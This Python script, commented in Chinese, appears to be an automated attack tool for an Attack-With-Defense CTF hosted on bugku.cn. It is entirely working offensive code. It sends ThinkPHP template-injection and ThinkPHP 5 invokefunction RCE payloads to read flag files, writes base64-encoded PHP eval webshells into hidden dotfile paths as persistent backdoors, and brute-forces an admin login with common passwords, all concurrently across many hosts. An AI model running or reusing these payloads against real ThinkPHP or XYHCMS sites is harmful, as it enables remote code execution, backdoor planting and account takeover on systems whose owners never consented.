#!/usr/bin/env python3
"""AWD 攻击脚本 - 批量获取flag (支持全量队伍 + 动态域名模板)
用法:
  python3 auto_attack.py                                  # 默认攻击 TARGETS 硬编码队伍
  python3 auto_attack.py --domain-template "192-168-1-{TEAM}.pvp7574.bugku.cn" --team-range 1 121 --threads 40
  python3 auto_attack.py poll <host>                       # 持续轮询单目标 flag
  python3 auto_attack.py backdoor <host>                   # 对单目标写后门
"""
import requests
import time
import base64
import re
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

DEFAULT_TEMPLATE = "192-168-1-{TEAM}.pvp7574.bugku.cn"

# 默认目标(向后兼容): 仅当未指定 --domain-template 时使用
TARGETS = {
    2:   "192-168-1-2.pvp7574.bugku.cn",
    5:   "192-168-1-5.pvp7574.bugku.cn",
    26:  "192-168-1-26.pvp7574.bugku.cn",
    117: "192-168-1-117.pvp7574.bugku.cn",
    173: "192-168-1-173.pvp7574.bugku.cn",
    187: "192-168-1-187.pvp7574.bugku.cn",
}

FLAG_PATHS = ['/flag', '/flag.txt', '/tmp/flag', '/root/flag', '/var/www/html/flag', '/app/flag']

def get_flag_rce(host):
    """通过ThinkPHP RCE获取flag"""
    for fp in FLAG_PATHS:
        try:
            url = f"http://{host}/index.php?s=/Index/index/name/${{@print(file_get_contents('{fp}'))}}"
            r = requests.get(url, timeout=8)
            m = re.search(r'flag\{[^}]+\}', r.text)
            if m:
                return m.group(), fp
        except:
            pass
    return None, None

def get_flag_shell_exec(host):
    """通过shell_exec获取flag"""
    try:
        url = f"http://{host}/index.php?s=/Index/index/name/${{@print(shell_exec('cat /flag* 2>/dev/null'))}}"
        r = requests.get(url, timeout=8)
        m = re.search(r'flag\{[^}]+\}', r.text)
        if m:
            return m.group()
    except:
        pass
    return None

def get_flag_tp5(host):
    """ThinkPHP 5 RCE"""
    try:
        url = f"http://{host}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/flag"
        r = requests.get(url, timeout=8)
        m = re.search(r'flag\{[^}]+\}', r.text)
        if m:
            return m.group()
    except:
        pass
    return None

def write_backdoor(host):
    """写入持久化后门"""
    # webshell内容
    shell = base64.b64decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==').decode()
    # 多种写入方式
    paths = [
        '/app/Data/.config.php',
        '/app/Public/.style.php',
        '/app/uploads/.index.php',
        '/app/Runtime/.cache.php',
        '/tmp/.bd.php',
    ]

    results = []
    for path in paths:
        # 方式1: file_put_contents
        payload = f"${{@file_put_contents('{path}',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=='))}}"
        try:
            url = f"http://{host}/index.php?s=/Index/index/name/{payload}"
            r = requests.get(url, timeout=8)
        except:
            pass

        # 验证
        try:
            web_path = path.replace('/app', '')
            r = requests.post(f"http://{host}{web_path}", data={'a': "echo 'BD_OK';"}, timeout=5)
            if 'BD_OK' in r.text:
                results.append(f"[✅] {web_path}")
                print(f"  [✅] 后门写入成功: {web_path}")
        except:
            pass

    # 方式2: fopen/fwrite
    for path in ['/app/Data/.conf2.php']:
        payload = "${{@$f=fopen('" + path + "','w');fwrite($f,'<?php @eval($_POST[a]);?>');fclose($f);echo 'WR';}}"
        try:
            url = f"http://{host}/index.php?s=/Index/index/name/{payload}"
            r = requests.get(url, timeout=8)
            if 'WR' in r.text:
                print(f"  [✅] fopen写入成功: {path}")
                results.append(f"fopen:{path}")
        except:
            pass

    return results

def brute_admin(host):
    """后台弱口令爆破"""
    passwords = ['admin', 'admin123', '123456', 'password', 'admin888', 'xyhcms',
                 'admin@123', '12345678', 'admin2024', 'xyh123456', 'Admin123',
                 'admin@2024', 'pass123', 'qwerty', 'letmein', 'welcome']
    for pwd in passwords:
        try:
            r = requests.post(f"http://{host}/xyhai.php/Manage/Public/login",
                            data={'username': 'admin', 'password': pwd}, timeout=5)
            if '成功' in r.text or 'success' in r.text or '跳转' in r.text or 'location' in r.text:
                return pwd
        except:
            pass
    return None

def attack_one(team, host):
    """攻击单个目标, 返回 (team, flag 或 None)"""
    try:
        r = requests.get(f"http://{host}/", timeout=6)
        st = r.status_code
    except:
        print(f"  [-] Team {team} 无法连接: {host}")
        return team, None

    if st not in (200, 301, 302, 401, 403, 500):
        print(f"  [-] Team {team} 状态码 {st}, 跳过")
        return team, None

    # RCE获取flag
    flag, fp = get_flag_rce(host)
    if flag:
        print(f"  [✅ RCE] Team{team} {fp}: {flag}")
        return team, flag

    # shell_exec获取flag
    flag = get_flag_shell_exec(host)
    if flag:
        print(f"  [✅ shell_exec] Team{team}: {flag}")
        return team, flag

    # TP5 RCE
    flag = get_flag_tp5(host)
    if flag:
        print(f"  [✅ TP5-RCE] Team{team}: {flag}")
        return team, flag

    # 后台弱口令
    pwd = brute_admin(host)
    if pwd:
        print(f"  [✅ 后台弱口令] Team{team} admin/{pwd}")
    else:
        print(f"  [-] Team {team} 未获取flag")
    return team, None

def attack_all(hosts, threads=30):
    """并发攻击所有目标"""
    print("=" * 60)
    print(f"  AWD 批量攻击 - {time.strftime('%H:%M:%S')}  (线程 {threads})")
    print("=" * 60)

    flags = {}
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(attack_one, t, h): (t, h) for t, h in hosts.items()}
        for f in as_completed(futs):
            t, h = futs[f]
            try:
                team, fl = f.result()
                if fl:
                    flags[team] = fl
                    print(f"  🏳️ Team{team}: {fl}")
            except Exception:
                pass
    return flags

def build_hosts(template, start, end):
    """根据域名模板+队段生成 {team: host}"""
    return {t: template.replace("{TEAM}", str(t)) for t in range(start, end + 1)}

def main():
    # 兼容旧的子命令模式: poll / backdoor
    args = sys.argv[1:]
    if args and args[0] in ("poll", "backdoor"):
        if args[0] == "poll":
            host = args[1] if len(args) > 1 else TARGETS[2]
            print(f"=== 持续获取 {host} 的flag ===")
            last_flag = None
            while True:
                flag, fp = get_flag_rce(host)
                ts = time.strftime('%H:%M:%S')
                if flag:
                    if flag != last_flag:
                        print(f"[{ts}] [新FLAG] {flag}")
                        last_flag = flag
                    else:
                        print(f"[{ts}] {flag} (不变)")
                else:
                    print(f"[{ts}] 获取失败")
                time.sleep(30)
        else:
            host = args[1] if len(args) > 1 else TARGETS[2]
            print(f"=== 写后门到 {host} ===")
            results = write_backdoor(host)
            if results:
                print(f"\n后门位置:")
                for r in results:
                    print(f"  {r}")
            else:
                print("  [-] 所有写入方式失败")
        return

    # 标准模式: argparse 动态目标
    parser = argparse.ArgumentParser(description="AWD 批量攻击获取flag")
    parser.add_argument("--domain-template", default=DEFAULT_TEMPLATE,
                        help=f"域名模板, 默认 {DEFAULT_TEMPLATE}")
    parser.add_argument("--team-range", type=int, nargs=2, default=[1, 121], metavar=("start", "end"))
    parser.add_argument("--threads", type=int, default=30)
    parser.add_argument("--out", default="")
    p = parser.parse_args(args)

    start, end = p.team_range
    hosts = build_hosts(p.domain_template, start, end)
    print(f"[*] 目标: {start}-{end} 共 {len(hosts)} 队, 线程 {p.threads}")

    flags = attack_all(hosts, threads=p.threads)

    print("\n" + "=" * 60)
    print("  攻击结果汇总")
    print("=" * 60)
    for team in sorted(flags):
        print(f"  Team{team}: {flags[team]}")
    print(f"\n  获取数量: {len(flags)} / {len(hosts)}")

    if p.out:
        import json
        with open(p.out, "w") as f:
            json.dump({"targets": hosts, "flags": flags}, f, ensure_ascii=False, indent=2)
        print(f"[✓] 结果写入 {p.out}")

if __name__ == '__main__':
    main()
